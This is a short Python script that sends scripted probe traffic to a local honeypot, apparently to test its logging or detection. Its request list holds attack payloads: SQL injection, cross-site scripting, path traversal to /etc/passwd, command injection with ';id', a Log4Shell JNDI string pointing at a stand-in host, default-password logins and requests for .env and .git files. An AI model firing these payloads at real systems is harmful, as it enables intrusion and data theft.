import requests, time
B = "http://127.0.0.1:5050"   # your own local honeypot only
UA = "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0"
T = [
 ("GET", "/", None, UA),
 ("GET", "/robots.txt", None, UA),
 ("GET", "/.env", None, "curl/8.0"),
 ("GET", "/.git/config", None, "curl/8.0"),
 ("GET", "/backup.sql", None, UA),
 ("GET", "/actuator/env", None, UA),
 ("GET", "/wp-login.php", None, UA),
 ("POST", "/wp-login.php", {"username": "admin", "password": "admin123"}, UA),
 ("POST", "/login", {"username": "root", "password": "toor"}, "python-requests/2.31"),
 ("GET", "/index.php?id=1' OR '1'='1", None, UA),
 ("GET", "/item?id=1 UNION SELECT user,pass FROM users", None, UA),
 ("GET", "/search?q=<script>alert(1)</script>", None, UA),
 ("GET", "/download?file=../../../../etc/passwd", None, UA),
 ("GET", "/download?file=..%2f..%2fetc%2fpasswd", None, UA),
 ("GET", "/ping?host=127.0.0.1;id", None, UA),
 ("GET", "/", None, "${jndi:ldap://x.example/a}"),
 ("GET", "/phpmyadmin/", None, "sqlmap/1.7"),
 ("GET", "/xmlrpc.php", None, UA),
 ("GET", "/random-page-123", None, UA),
]
for m, p, data, ua in T:
    requests.request(m, B + p, data=data, headers={"User-Agent": ua}, timeout=10)
    time.sleep(0.1)
print(len(T), "requests sent")
